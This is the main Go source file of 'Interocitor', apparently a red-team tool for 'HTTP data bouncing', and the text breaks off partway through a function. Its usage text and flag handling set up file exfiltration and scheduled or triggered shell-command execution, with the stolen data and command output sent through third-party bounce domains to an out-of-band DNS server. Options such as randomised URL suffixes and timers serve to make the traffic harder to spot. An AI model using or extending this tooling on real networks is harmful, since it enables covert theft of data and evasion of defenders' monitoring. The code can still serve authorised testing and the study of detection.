// Interocitor
// Application for HTTP data bouncing
//
// Nick Dunn 2023-2024

// Main Package - entry point
// These functions obtain settings from config file and command line, initialize structures,
// and call required functions from any other files, in line with commandline/config file settings.

package main

// Import Go standard packages
import (
	"flag"
	"fmt"
	"os"
	"strconv"
	"strings"
)

// Global settings structs to be shared across packages
var GeneralSettings General
var OOBSettings Bouncer
var Exfiltrator FileExfil
var CmdSettings CmdOutput
var TriggerSettings CmdTrigger
var UploadTriggerSettings CmdTrigger
var CryptoSettings Encryption
var ExfilClient HTTPClient // potentially remove this as all settings held elsewhere??

// Usage string - needed due to short and long command line options
const usage = `Usage of Interocitor:
Note - Settings from config file [config.ini] will be used, unless overridden by command line parameter.

  --config <file>	Specify a config file to read settings from. Default is config.ini, and is read by default
  --no-config		Switch off reading settings from config file. Note that config read is on by default, command line settings will overide config settings where present

  -m, --mode <mode>	Operational mode for application. Choose from targetcheck|file|cmd|poll|dns (default = file)
  -t, --task <task>	Task(s) to be carried out. Select from following options within mode:
  		All Modes:	bouncecheck|dns
		File Mode:	exfil|json_extract|extract_decrypt|file_decrypt
		Cmd Mode:	cmd|file
		Poll Mode:	

  -n, --num-times <amount>		Number of times to repeat each HTTP request (default = 1)

  -b, --bounce-targets <path>	Path to the file containing potential targets to aid exfiltration
  -d, --domains-file <path>		Path to the file containing list of bouncable domains - this will be the result of a bounce check and the input for exfil operations

  -f, --file <path>	Path to the binary file to be read and exfiltrated
  -u, --uuid <uuid>	Identifier for the current stream

  -o, --oob <addr>	IP address or DNS name for the OOB exfil DNS server
  --verb <verb>		HTTP verb to use for exfiltration attempts (GET is default if unspecified)
  --append-url		Add random additional path suffixes to exfiltration URL to render exfil paths less uniform

  -j, --json-file <path>	Extract (and optionally decrypt) data from this JSON file
  -c, --crypt-file <path>	Extract JSON data to this file before decryption
  -l, --output-file <path>	Write decrypted exfiltrated data to this file following decryption (default = output.bin)

  -s --cmd <shell_command>		Command to run in shell (output will be exfiltrated from network)
  --cmd-file <filename>			Filename of file containing commands (output will be exfiltrated from network)
  -p --params <param,param,...>	Parameters to be executed by the command specified in -s or --cmd parameter (above)
  -r, --cmd-frequency <freq>	Frequency for running commands in shell mode. Choose from once|fixed|random|trigger	(default = once)
  --cmd-time-unit <unit>	 	Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)
  --cmd-time-interval <n>		Number of units for the above options (default = 1). Note that if random was chosen this will be in the form min|max e.g 4|25
  --report-frequency <freq>		Frequency for returning command outputs in shell mode. Choose from immediate|fixed|random (default = immediate)
  --rep-time-unit <unit>	 	Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)
  --rep-time-interval <n>		Number of units for the above options (default = 1). Note that if random was chosen this will be in the form min|max e.g 4|25

  --shell <shelltype>			Select the shell required, if you wish to use something different from the system default (e.g. sh, csh, bash, zsh, powershell)
  --shell-output <filename>		The filename to hold shell output. This file will be exfiltrated as/when required (default = shellout.txt)
  --increment-uuid				Increment the UUID for each cmd execution - this will allow extraction of responses to different files in the event of multiple commands executed on a timer
  								Note that if a user has chosen a numeric UUID it will increment, if a user chooses a string UUID it will have an incrementing number appended
  --pipe-in						Allow system commands to be piped into user-specified cmd
  --pipe-out					Allow cmd output to be piped into system commands
  --in-cmds <cmd|cmd|...>		System commands to be piped into cmd
  --out-cmds <cmd|cmd|...>		System commands for cmd output to be piped into
  --cancel-timeout <seconds>	Number of seconds before automatically sending cancel (ctrl+c) to cmd (default = 0 = do not send cancel)

  --trigger-mode <mode>			Type of trigger condition to be satisfied before running a command whose output will be exported, in the form 'type|condition'
								'type' can be one of cmd, file, or dir, 'condition' can be one of ne, lt, gt (e.g. dir|gt) This setting will default to cmd|ne if mangled or invalid values are given
								ne = not equal - output different from previously, lt = less than - output is shorter, file has reduced in size, dir has less content, gt = greater than - opposite of le 
  --trigger-target <target>		Target for the above trigger condition - this will be a shell command, filename or directory name.
  --trigger-time-unit <unit>	Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)
  --trigger-time-interval <n>	Number of units for the above options (default = 1)

  --log				Enable logging
  --log-file <path>	Specify a log filename.
  -v, --verbose		Verbose console output
  -h, --help		Show this usage information and exit 
`

// Interocitor entry point
func main() {

	// File exfil structs always have the same number of parts
	// Define the const count here to avoid multiple code changes if struct changes
	FileExfilStructParts = 6

	// Create empty structs with default values (where applicable) to hold data from inifile and cmd line params
	createStructs()

	// Define variables that will be set by the flag values
	// This is necessary in order to allow short and long flags for the following vars
	var mode string             // Operational mode (exfil, cmd, poll, dns)
	var task string             // Individual task (exfil file, decrypt file, parse DNS file, etc.)
	var numtimes int            // Number of times to send/repeat each HTTP request
	var bounceTargetFile string // File with list of potential bounce targets
	var domainsFile string      // File with list of bouncable domains - this will be the output of a bounce check and the input for exfil operations
	var filePath string         // File to be exfiltrated
	var streamID string         // An identifier to distinguish between exfiltrated files, cmd outputs, etc.
	var oobServer string        // The IP address or DNS name of the DNS exfil server
	var jsonFile string         // The DNS JSON file containing the exfiltrated data
	var cryptFile string        // The file to hold the encrypted data extracted from the DNS file (if applicable)
	var writeToFile bool        // Write encrypted data extracted from JSON file to it's own separate file before decrypting (or to await later decryption)
	var writeFile string        // The file to hold encrypted data extracted from JSON file
	var cmdFrequency string     // Frequency of execution in cmd mode
	var shellCommand string     // The command to run (in single cmd mode), or file containing shell commands to execute (in cmd file mode)
	var cmdParams string        // This string is to be broken up into individual params

	var verbose bool
	var showHelp bool

	// Get any ini file settings before checking commandline
	configFile := flag.String("config", "config.ini", "Specify a config file to read settings from. Default is config.ini, and is read by default.")
	noConfig := flag.Bool("no-config", false, "Switch off load settings from config file. Note that config read is on by default, command line settings will overide config settings.")

	// Check any command line options for user-configurable settings
	// Note - no default values assigned as we don't want to overwrite anything applied from the command line
	flag.StringVar(&mode, "m", "", "Operational mode for application. Choose from targetcheck|file|cmd|poll|dns.")
	flag.StringVar(&mode, "mode", "", "Operational mode for application. Choose from targetcheck|file|cmd|poll|dns.")
	flag.StringVar(&task, "t", "", "Task(s) to be carried out. Select from bouncecheck|exfil|json_extract|extract&decrypt|file_decrypt")
	flag.StringVar(&task, "task", "", "Task(s) to be carried out. Select from bouncecheck|json_extract|exfil|extract&decrypt|file_decrypt")

	flag.IntVar(&numtimes, "n", 0, "Number of times to repeat each HTTP request (default = 1)")
	flag.IntVar(&numtimes, "num-times", 0, "Number of times to repeat each HTTP request (default = 1)")

	flag.StringVar(&bounceTargetFile, "b", "", "Path to the file containing potential targets to aid exfiltration.")
	flag.StringVar(&bounceTargetFile, "bounce-targets", "", "Path to the file containing potential targets to aid exfiltration.")
	flag.StringVar(&domainsFile, "d", "", "Path to the file containing list of bouncable domains - this will be the output of a bounce check and the input for exfil operations.")
	flag.StringVar(&domainsFile, "domains-file", "", "Path to the file containing list of bouncable domains - this will be the output of a bounce check and the input for exfil operations.")

	flag.StringVar(&filePath, "f", "", "Path to the binary file to be read and exfiltrated.")
	flag.StringVar(&filePath, "file", "", "Path to the binary file to be read and exfiltrated.")
	flag.StringVar(&streamID, "u", "", "Identifier for the current stream.")
	flag.StringVar(&streamID, "uuid", "", "Identifier for the current stream.")
	flag.StringVar(&oobServer, "o", "", "URL for the OOB DNS server.")
	flag.StringVar(&oobServer, "oob", "", "URL for the OOB DNS server.")

	flag.StringVar(&jsonFile, "j", "", "Extract (and optionally decrypt) data from this JSON file.")
	flag.StringVar(&jsonFile, "json-file", "", "Extract (and optionally decrypt) data from this JSON file.")
	flag.StringVar(&cryptFile, "c", "", "Extract JSON data to this file before decryption.")
	flag.StringVar(&cryptFile, "crypt-file", "", "Extract JSON data to this file before decryption")
	flag.BoolVar(&writeToFile, "w", false, "Write encrypted exfiltrated data to this file prior to decryption.")
	flag.BoolVar(&writeToFile, "write-crypt", false, "Write encrypted exfiltrated data to this file prior to decryption.")
	flag.StringVar(&writeFile, "l", "", "Write decrypted exfiltrated data to this file following decryption.")
	flag.StringVar(&writeFile, "output-file", "", "Write decrypted exfiltrated data to this file following decryption.")

	flag.StringVar(&shellCommand, "s", "", "Command to run in shell (output will be exfiltrated from network)")
	flag.StringVar(&shellCommand, "cmd", "", "Command to run in shell (output will be exfiltrated from network)")
	flag.StringVar(&cmdParams, "p", "", "Parameters to be executed by the command specified in -s or --cmd parameter.")
	flag.StringVar(&cmdParams, "params", "", "Parameters to be executed by the command specified in -s or --cmd parameter.")

	shellCommandFile := flag.String("cmd-file", "", "Filename of file containing shell commands (output will be exfiltrated from network)")
	shellType := flag.String("shell", "", "Select the shell required, if you wish to use something different from the system default (e.g. sh, csh, bash, zsh, powershell)")
	cancelTimeout := flag.String("cancel-timeout", "", "Number of seconds before automatically sending cancel (ctrl+c) to cmd (default = 0 = do not send cancel)")
	incrementUUID := flag.Bool("increment-uuid", false, "Increment the UUID for each cmd execution - this will allow extraction of response ranges, extraction of responses to dfferent files, etc.")

	flag.StringVar(&cmdFrequency, "r", "", "Frequency for running commands in shell mode. Choose from once|fixed|random")
	flag.StringVar(&cmdFrequency, "cmd-frequency", "", "Frequency for running commands in shell mode. Choose from once|fixed|random")
	cmdFreqUnitType := flag.String("cmd-time-unit", "", "Unit type for the cmd execution frequency. Choose from sec|min|hr|day	(default = hr)")
	cmdFreqUnitAmt := flag.String("cmd-time-interval", "", "Number of units for the cmd execution frequency (default = 1)")
	repFrequency := flag.String("report-frequency", "", "Frequency for returning command outputs in shell mode. Choose from immediate|fixed|random")
	repFreqUnitType := flag.String("rep-time-unit", "", "Unit type for the report back frequency. Choose from sec|min|hr|day	(default = hr)")
	repFreqUnitAmt := flag.String("rep-time-interval", "", "Number of units for the report back frequency (default = 1)")

	triggerType := flag.String("trigger-mode", "", "Type of trigger condition to be satisfied before running a command whose output will be exported, in the form 'type|condition', type' can be one of cmd, file, or dir, 'condition' can be one of ne, lt, gt	(e.g. dir|gt)")
	triggerTarget := flag.String("trigger-target", "", "Target for the above trigger condition - this will be a shell command, filename or directory name")
	triggerTimeUnit := flag.String("trigger-time-unit", "", "Unit type for the above frequency. Choose from sec|min|hr|day	(default = hr)")
	triggerTimeInterval := flag.String("trigger-time-interval", "", "Number of units for the above options (default = 1)")

	oobVerb := flag.String("verb", "", "HTTP verb to use for exfiltration attempts.")
	appendURL := flag.Bool("append-url", false, "Add random additional path suffixes to exfiltration URL to render exfil paths less uniform.")
	enableLog := flag.Bool("log", false, "Enable logging.")
	logFile := flag.String("log-file", "", "Specify a log filename.")

	flag.BoolVar(&verbose, "v", false, "Verbose console output.")
	flag.BoolVar(&verbose, "verbose", false, "Verbose console output.")
	flag.BoolVar(&showHelp, "h", false, "Show this usage information and exit.")
	flag.BoolVar(&showHelp, "help", false, "Show this usage information and exit.")

	// Set new Usage function to prevent duplication of help details for short and long options
	flag.Usage = func() { fmt.Print(usage) }

	// Parse flags and behave as required
	flag.Parse()

	// Show usage information if requested by user
	if showHelp {
		fmt.Print(usage)
		os.Exit(Success)
	}

	// Check arguments and behave accordingly - check if user has specified no config file
	// Read the config file if user has not set 'noConfig' on the command line
	if !(*noConfig) {
		// Read settings from config file unless specified otherwise
		ConfigRead(*configFile)
	}

	// Show welcome message to user
	printWelcome()

	// Since all command line boolean parameters default to false we will OR the command line and ini file values.
	GeneralSettings.Verbose = verbose || GeneralSettings.Verbose
	GeneralSettings.AppendURL = *appendURL || GeneralSettings.AppendURL
	GeneralSettings.LogEnabled = *enableLog || GeneralSettings.LogEnabled

	// Check for cmd line params, and proceed to parse/apply if any are present
	arg_len := len(os.Args[1:])
	if arg_len > 1 {

		// Only proceed if something has been specified on the command line
		// Otherwise, we'll be using the default values or the values from the config file
		if mode != "" {
			// Check mode in order to apply suitable settings
			StringToMode(mode)
		}

		// Only proceed if something has been specified on the command line
		// Otherwise, we'll be using the default value or the value from the config file
		if task != "" {
			// Check task and apply any additional settings
			StringToTask(task)
		} else {
			// If no task provided, selct appropriate mode for task
			switch GeneralSettings.Mode {
			case TargetMode:
				GeneralSettings.Task = BounceCheck
			case CmdMode:
				GeneralSettings.Task = SingleCommand
			default:
				GeneralSettings.Task = FileExfiltrate
			}
		}

		// These settings will be required in almost all situations
		if oobServer != "" {
			OOBSettings.Server = oobServer // Required for evertything except file decrypt or DNS
		}
		if streamID != "" {
			Exfiltrator.UUID = streamID // Required for everything
		}
		if *logFile != "" {
			GeneralSettings.LogFile = *logFile // User may specify their own logfile name
		}
		if numtimes > 0 {
			GeneralSettings.NumTimes = numtimes // Used to give number of times each HTTP request is sent (increase to avoid losses)
		}

		// Apply Bouncer HTTP verb settings only if modified on cmd line
		if *oobVerb != "" {
			OOBSettings.HTTPVerb = *oobVerb
		}

		// Get the bounce filenames - both required for multiple modes and multiple situations
		if bounceTargetFile != "" {
			// List of domains to be tested for bounce-ability
			GeneralSettings.TargetsFile = bounceTargetFile
		}
		if domainsFile != "" {
			// List of domains known to be usable for the bouncing
			GeneralSettings.BouncersFile = domainsFile
		}

		// Apply any required/provided settings for the selected mode
		switch GeneralSettings.Mode {
		case TargetMode:
			applyTargetModeSettings(bounceTargetFile, jsonFile, domainsFile)
		case FileMode:
			applyFileModeSettings(filePath, jsonFile, cryptFile, writeFile, writeToFile)
		case CmdMode:
			applyCmdModeSettings(shellCommand, *shellCommandFile, cmdParams, *shellType, *cancelTimeout, cmdFrequency, *cmdFreqUnitType, *cmdFreqUnitAmt, *repFrequency, *repFreqUnitType, *repFreqUnitAmt, *incrementUUID)
			if *triggerType != "" {
				applyTriggerSettings(*triggerType, *triggerTarget, *triggerTimeInterval, *triggerTimeUnit)
			}
			// ToDo:	add Poll Mode and DNS Mode functionality
		}
	} // End if arg_len > 1

	// After Mode and Task have been established, carry out required operation
	switch GeneralSettings.Mode {
	case TargetMode:
		executeTargetTasks()
	case FileMode:
		executeFileTasks()
	case CmdMode:
		executeCmdTasks()
		// ToDo:	add Poll Mode and DNS Mode functionality
	}
} // End main

// Print application title and ASCII art to terminal on startup
func printWelcome() {

	// The strings to be used for screen output
	title := `	 ___       _                      _ _             
	|_ _|_ __ | |_ ___ _ __ ___   ___(_) |_ ___  _ __ 
	 | || '_ \| __/ _ \ '__/ _ \ / __| | __/ _ \| '__|
	 | || | | | ||  __/ | | (_) | (__| | || (_) | |   
	|___|_| |_|\__\___|_|  \___/ \___|_|\__\___/|_|   `
	exeter := `	%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
	#%%%%@@@%%%%%*+=-:..........................::-**##***#*******##%%#*****************************++++
	##%%%%%%%%%%#%*-.................................:=+**********#####*******************+*************
	##%%%%%@%%%##=:........................................=********##**********************************
	##%%%%%%#**+:.............................................-++****##*********************************
	###%%%%%#*=:......::::...........................::......:....:+*#**********************************
	###%%%%##%*:......:..::.............:..:...................:..:..=*****#***********+****************
	*##%%%#*##*:.........:::.......:::.::::::::..........:::::::::::::=++*******************************
	**#%%%%%%%#-........:::..:::::::::::::::::..:.........:::::::::---:-*******************+************
	###%%%%%%%%+:::...::::::::---:::::::::::::::::..........:::::::-----:=**+***************************
	#*#%%%%%#%%#=-::::::-::::----::::::::::::::..:.:::........:::::------::=*************#**************
	##%%%%%##**=-::::::::::::---::::::::::::::::::::::.:........::::-------:=+***********#**************
	%%%@@%%@%%#+::.:-:::::--:-::::::::::::::::::::::::::::.......:::::-----=-::**********#**************
	@@@@@@@%%%%#**#+--:----:::::--:::::::::::::::::::::..........::::--------==**********#*+************
	@@@@@@@@@%%%%%%=--::::::::::::::::::::::::::::::.:............:::--------=+++***********************
	@@@@@@@@@@@%@%%=-:::::::::::::::::::::::::::::::.::...........::::-------=++************************
	@@@@@@@@@@%%@%#-:::::::::::::::::::::::::::::::.:.:..........::::::::---=++++***********************
	@@@@@@@@@%%%%%=:::::::::::::::::::::::::::::::...............:::::::::--=+++*****++*****************
	@@@@@@@@@@%%%#-:::::::::::--:-::::::::::::::::..............:::::::::::-==++++*+**+*****************
	@@@@@@@@@@%%%#-::::::::----------:::::::::::..............::::::::::.::--==++****++*+**+************
	@@@@@@@@@@%%%#==-:::-------------:::::::::--::............:::::::::.::---===+++++++++**+************
	@@@@@@@%@%%%%%+==----=----------:::::--------:::..........:::::::::::-:--===++++++++*+*+************
	%###%%%%%%%#**:::::::::-:-::::::-::::::---------::..:.....:::::::::::::--==+=+++++++++*++**********+
	%###%%%%%%#-:::----:-----::::::::-----:-::-----::::::......:::....:::::::-=+++++++++++*+++***++*++**
	@%%@@@@@@@%#=+-==---=-===+*=+++--=------------:--:::::::...:::.::::::::::-=+++++++++++*+++++++++*+++
	@@@@@@@@@@@@@*+#**===+*##%@@%*++===---------------::..:::::::::*%%#=-:::--==++++++++++*++*++++++++++
	@@@@@@@@@@@@@@#@@%#+==*#@@@@@@%%%#*+++++==-------::.....:::-=#+::::-+-::-==+*+++++++++*++*++++++++++
	@@@@@@@@@%%@@%%%%=-=:--===+#%@=:::.-+===------:---:-:..::---:::::.-:--::-==+++++++++++**++++++++++++
	%%%%%%%%%%%%%%%%#=--::-------+=----------:::---------::::-==-*+=::::--::--=+*+++++++++**++++++++++++
	%%%%%%%%%%%%%%%%==+::::::----==----------::::--------=+*+=-==:=#*=-:--::-==++****+++++**+++==+++++++
	%%@@@%%%%%####%#---:::::::::::-----::--::::::-----------::::=-:::==:-::--=++++*+++++++*+++++++++++++
	#%@@@@@@%%#####+:-:::::::::::::::::::::::::::----------::::--:::--::=-:::-++++++++++++++++=+++++++++
	%%@@@@@@%%%%##%#--::----::--::::::::::::::::----------------:::::-:=%-:::=++++++++++++++++++++++++++
	%%%%%%%@%%%%%###::::::-----=+-::::::::::::::--------------==--=-:.=--::-==+++++++++++=++++++++++++++
	***+********###*:--:----=--=++-:::::::--:::---------------:::::-+@@=+====++++++++=====++++++++++++++
	--------======++++*#*%@+=**--+-::::::----:-------------==%#**#@@@+==---++++++++++=====+*++++++++++++
	===--===========+=+-----:::::::-::::::----------------==+%@@@@@*+**--=++++++++++======++++++++++++++
	===========+++++++=----:::::::::-:::::---------------==+=-+*=--=*%+=+=++*++++++++=====++=+++++++++++
	------=====++**+++=+=-----===---:-::::::-------------=+*+=----=+#%*==+****+++++++=====++=+++++++++++
	---------==+++++++=#+=---=======---:::-------------==+**=----=+*#++==++*+++++++++=====++=+++++++++++
	-:-------====+++++++--------::::-----::---------====+++------=+***********+**++++++==++*=+++++++++++
	-::----------==++++++#**+++=--::::------------===++*%+------=++**+##****+**+++++++====++=+++++++++++
	::::::::--------==+==-::::::::-::::-------====++*%@@+------==++==*#%********+++++++==++*=+++++++++++
	:::--::::::----------:::::::::::::---======++*%@%@%=--::---=+===.+#%********+++++++++++*=+++++++++++
	:::::::--------------:::::::::::--===+++**#%%#*++=--::::::--==-..=*#********+++++++++++*=+++++++++++
	--::::---::---::-----==------====+++**#%%%*++====--::::::----:...=*#*******++++++++++++*=+++++++++++
	:::--------:::--------+####%%%%%##*******++====-----:::::---.....=#%+*****+++++++++++++*=++++*++++++
	::::------:::::-------==+##%@%#######*++==-----------::---:......+#%@+*****++++++++++++*=+++++++++++
	------------------:-==+*#%@@+:=#@@%#*++++++=-==-----::-:.........*%@@@++**++++++++++====-=++++++**++
	-::::---------::--=+++**#%@@@-....-===-::::::--------:.........:-#%@@@@#+-+++++*=:..::-:--:::::-::::
	-::::::::::----+++++***##%@@@@:............:-----=-...........::*%%@@@@@%#==-=---#@@@@%#*==++=+++*=+
	:::::::::-==++*#++++*#*######%@=.........#@@*%*+-:#%+:.:::::::--@@@@@@@@@@%*%*-%@@@@@@@@%#****#%%%%%
	---::::---===+**--======++++*+**#=:.....=@@@@@@@@@@@@@@=::::--=*@@@@@@@@@##**=#@@@@@@@@%%#**#@@@@@@@
	::-+#**++=---:-::-------==++***#*:......*@@@@@@@@@@@@@@@@---=+=%@@@@@@@@@@@%#*##@@@@@@@**+*%@@@@@@@@
	-----=++*+===-::-=---=-==+++****#*......*@@@@@@@@@@@@##@@@=-++=@@@@@@@@@@@@@@%%%*%@@@@@#++#%@@@@@@@@
	*+--:-==++===-----------=******#**+.....*@@@@@@@@@@@@-:=%@@=+=*@@@@@@@@@@@@@@@@@@@%@@@@+**%@@@@@@@@@
	#+**=---++*++:---=-----=+*#*****###+......*@@@@@@@@@@-:--=#*+=#@@@@@@@@@@@@@@@@@@@@@@@@+**%@@@@@@@@@
	%%#*#+=--=+*+-===--=-=++##*****#####+......=@@@@@@@@@=:==--++=@@@@@@@@@@@@@@@@@@@@@@@@@*+##@@@@@@@@@
	%#@%***+=:=*%%#*+=+=+*+*********#*###-.....*@@@@@@@@@@+-=---++@@@@@@@@@@@@@@@@@@@@@@@@@=+#@@@@@@@@@@
	%%%@@**#*==-=%@@@@%*##++*#*###*##*#*#%:...*@@@@@@@@@@@@+=---=%@@@@@@@@@@@@@@@@@@@@@@@@@++%@@@@@@@@@@
	%%#%@@#*##*++-*%@+-+####*****#**##***##..=@@@@@@@@@@@@@%=+--=%@@@@@@@@@@@@@@@@@@@@@@@@@+*@@@@@@@@@@@
	#%#@#@@#**##**=-=###*##########%**%###%=:@@@@@@@@@@@@@@@++=-=@@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@@@@@@@@@
	*##%%%@@**#%##+*#*####*#########*##*###%=@@@@@@@@@@@@@@@%==-=@@@@@@@@@@@@@@@@@@@@@@@@@*#%@@@@@@@@@@@
	%*#%%%%@%+*##%@%*#*##########****######%%@@@@@@@@@@@@@@@@*+-*@@@@@@@@@@@@@@@@@@@@@@@@@#%@@@@@@@@@@@@
	`
	copyright := "Nick Dunn	2023-2024"

	// Output to screen
	fmt.Println(title)
	fmt.Println()
	fmt.Println(exeter)
	fmt.Println()
	fmt.Println(copyright)
	fmt.Println()
} // End printWelcome

// Initialize objects that will hold global data
func createStructs() {

	GeneralSettings = *NewGeneralDefault()
	OOBSettings = *NewBouncerDefault()
	CryptoSettings = *NewEncryptionDefault()
	Exfiltrator = *NewFileExfilDefault()
	CmdSettings = *NewCmdModeDefault()
	TriggerSettings = *NewCmdTriggerDefault()
	UploadTriggerSettings = *NewCmdTriggerDefault()
	// ExfilClient
}

// Set target indentification settings
// Set Exfiltration settings
func applyTargetModeSettings(bounceTargetFile string, jsonFile string, domainsFile string) {

	// Apply any additional required/provided settings for the selected target identification task
	// Check for presence of variable before applying/overwriting original
	if bounceTargetFile != "" {
		GeneralSettings.TargetsFile = bounceTargetFile
	}
	if domainsFile != "" {
		GeneralSettings.BouncersFile = domainsFile
	}
	if jsonFile != "" {
		OOBSettings.JSONFile = jsonFile
	}
}

// Set Exfiltration settings
func applyFileModeSettings(filePath string, exfilFile string, cryptFile string, writeFile string, writeToFile bool) {

	Exfiltrator.WriteCrypt = writeToFile || Exfiltrator.WriteCrypt

	// Apply any additional required/provided settings for the selected exfil task
	// Check for presence of variable before applying/overwriting original
	if filePath != "" {
		Exfiltrator.InputFile = filePath
	}
	if exfilFile != "" {
		OOBSettings.JSONFile = exfilFile
	}
	if cryptFile != "" {
		Exfiltrator.CryptFile = cryptFile
	}
	if writeFile != "" {
		Exfiltrator.OutputFile = writeFile
	}
}

// Set Command mode settings
func applyCmdModeSettings(command string, commandFile string, params string, shellname string, cancelTimeout string, cmdFrequency string,
	cmdFreqUnits string, cmdFreqAmt string, repFrequency string, repFreqUnits string, repFreqAmt string, incUUID bool) {

	// Used for min and max values for random timers
	var min, max int
	var err error

	// Set the command, according to task type this will be a shell command, a filename or a file exfil
	if GeneralSettings.Task == SingleCommand && command != "" {
		CmdSettings.Command = command
	} else if GeneralSettings.Task == CommandFromFile && commandFile != "" {
		CmdSettings.ShellInputFile = commandFile
	} else {
		fmt.Println("Error! No shell command or command filename provided.")
		os.Exit(NoCommands)
	}

	// Apply any additional settings for single command mode
	if GeneralSettings.Task == SingleCommand {
		if params != "" {
			// Split the params into an array
			CmdSettings.Params = strings.Split(params, " ")
		}

		// Set the particular shell required by the user (default is the OS default)
		CmdSettings.OSShell = shellname
	}

	// Check if user has applied any timeout to send Cancel signal to process
	if cancelTimeout != "" {
		StringToCancel(cancelTimeout)
	}
	// Set UUID to increase for each cmd output if required
	CmdSettings.IncrementUUID = incUUID || CmdSettings.IncrementUUID

	// Timing of commands
	if cmdFrequency != "" {
		StringToCmdTimer(cmdFrequency)
	}
	if GeneralSettings.Verbose {
		fmt.Println("Operational Timing Mode:	", timerModeToString(CmdSettings.OpMode))
	}

	// If commands are being run multiple times, apply the timer settings
	if CmdSettings.OpMode != RunOnce {

		// The units and amount are set regardless (they have defaults)
		// They will only be used dependent upon the other settings applied above and below
		CmdSettings.OpTimingMode = StringToTimerMode(cmdFreqUnits)
		if CmdSettings.OpMode == RepeatRandom {
			min, max = getMaxAndMin(cmdFreqAmt)
			CmdSettings.RandOpMin = min
			CmdSettings.RandOpMax = max
		} else {
			CmdSettings.OpTiming, err = strconv.Atoi(cmdFreqAmt)
		}

		if repFrequency != "" {
			// Set frequency and timing of report exfiltration
			StringToUploadTimer(repFrequency)
			if GeneralSettings.Verbose {
				fmt.Println("Upload Timing Mode:	", timerModeToString(CmdSettings.ResponseMode))
			}

			CmdSettings.ResponseTimingMode = StringToTimerMode(repFreqUnits)
			if CmdSettings.ResponseMode == RepeatRandom {
				min, max = getMaxAndMin(repFreqAmt)
				CmdSettings.RandOpMin = min
				CmdSettings.RandOpMax = max
			} else {
				CmdSettings.ResponseTiming, err = strconv.Atoi(repFreqAmt)
			}

			if err != nil {
				fmt.Println("Invalid timing frequency passed in on command line. Use interocitor -h for further information.")
				os.Exit(InvalidInputFormat)
			}
		}

		// Define trigger required for other actions/report back?
	}
}

// Split user input into two digits, assuming pipe separator
func getMaxAndMin(input string) (min int, max int) {

	digits := strings.SplitN(input, "|", 2)

	min, err1 := strconv.Atoi(digits[0])
	if err1 != nil {
		fmt.Println("Invalid Input! Random timings require a min and max value in the format: 1|9")
		os.Exit(InvalidInputFormat)
	}

	max, err2 := strconv.Atoi(digits[1])
	if err2 != nil {
		fmt.Println("Invalid Input! Random timings require a min and max value in the format: 1|9")
		os.Exit(InvalidInputFormat)
	}

	return
}

// Split user input into two strings, assuming pipe separator
func applyTriggerSettings(mode string, target string, timerInterval string, timerUnits string) {

	var err error

	// Get the type of trigger required by the user
	settings := strings.SplitN(mode, "|", 2)
	StringToTriggerMode(settings[0])
	StringToTriggerType(settings[1])

	if target != "" {
		if TriggerSettings.TriggerMode == FileSize || TriggerSettings.TriggerMode == DirectoryListing {
			// If measuring a file or directory just need to assign the specified target
			TriggerSettings.TargetPath = target
		} else {
			// If running a command, split into command and params
			parts := strings.Split(target, " ")
			TriggerSettings.ShellCommand = parts[0]
			TriggerSettings.ShellParams = parts[1:]
		}
	} else if TriggerSettings.TargetPath == "" && TriggerSettings.ShellCommand == "" {
		fmt.Println("No trigger target provided!")
		os.Exit(InvalidTriggerTarget)
	}

	// Set the amount and units for the timer
	if timerUnits != "" {
		TriggerSettings.TriggerTimerMode = StringToTimerMode(timerUnits)
	}
	TriggerSettings.TriggerTiming, err = strconv.Atoi(timerInterval)
	if err != nil || TriggerSettings.TriggerTiming < 1 {
		fmt.Println("Timing value not a valid integer. Using default value of 1 instead.")
		err = nil
		TriggerSettings.TriggerTiming = 1
	}
}

// Return a verbal description of the timer settings
func timerModeToString(timerMode int) string {

	retval := "No timer mode set."

	switch timerMode {
	case RunOnce:
		retval = "Single Execution"
	case RepeatFixed:
		retval = "Execute on Fixed Timer"
	case RepeatRandom:
		retval = "Execute on Random Timer"
	case RepeatOnTrigger:
		retval = "Execute on Successful Trigger Evaluation"
	}

	return retval
}

// Set day and date frequencies for cmd line input and output

// Set any cancel conditions/timings

// Carry out the required file exfil operation
func executeTargetTasks() {

	// Select and execute the appropriate task according to current setting
	switch GeneralSettings.Task {
	case BounceCheck:
		DomainBounceCheck()
	case HostExtract:
		extractDnsJsonToFile()
	default:
		// File Mode selected without a matching File Task
		fmt.Println("Error:	TargetCheck Mode has been selected without an appropriate TargetCheck Task.")
		os.Exit(TaskMisMatch)
	} // End switch GeneralSettings.Task
}

// Carry out the required file exfil operation
func executeFileTasks() {

	// Select and execute the appropriate task according to current setting
	switch GeneralSettings.Task {
	case FileExfiltrate:
		ExfiltrateFileData(Exfiltrator.InputFile, Exfiltrator.UUID, OOBSettings.Server, []byte(CryptoSettings.Key))
	case DNSExtract:
		extractDnsJsonToFile()
	case DNSExtractDecrypt:
		extractDecryptDnsJson()
	case FileDecrypt:
		DecryptFile(Exfiltrator.CryptFile, Exfiltrator.OutputFile, []byte(CryptoSettings.Key))
	default:
		// File Mode selected without a matching File Task
		fmt.Println("Error:	FileMode has been selected without an appropriate File Task.")
		os.Exit(TaskMisMatch)
	} // End switch GeneralSettings.Task
}

// Carry out the required cmd exfil operation
func executeCmdTasks() {

	// Select and execute the appropriate task according to current setting
	switch CmdSettings.OpMode {
	case RunOnce:
		Execute()
	case RepeatFixed:
		ExecuteCmdOnFixedTimer()
	case RepeatRandom:
		// Note - Fixed timer will assign a random number of units between runs if OpMode = RepeatRandom
		ExecuteCmdOnFixedTimer()
	case RepeatOnTrigger:
		ExecuteCmdOnTrigger()
	default:
		// Cmd Mode selected without a matching Cmd Task
		fmt.Println("Error:	CmdMode has been selected without an appropriate Cmd Task.")
		os.Exit(TaskMisMatch)
	} // End switch GeneralSettings.Task
}

// Carry out the required poll operation

// Carry out the required DNS operation

// Extract data from DNS JSON file (and decrypt if required)
func extractDnsJsonToFile() {

	// Extract data from JSON file and output to rebuilt encrypted file
	if OOBSettings.JSONFile != "" {

		var payloads []string
		var err error
		var outfile string
		var newlines bool

		// Get payloads from file, function depends on what data we're extracting
		if GeneralSettings.Mode == FileMode {
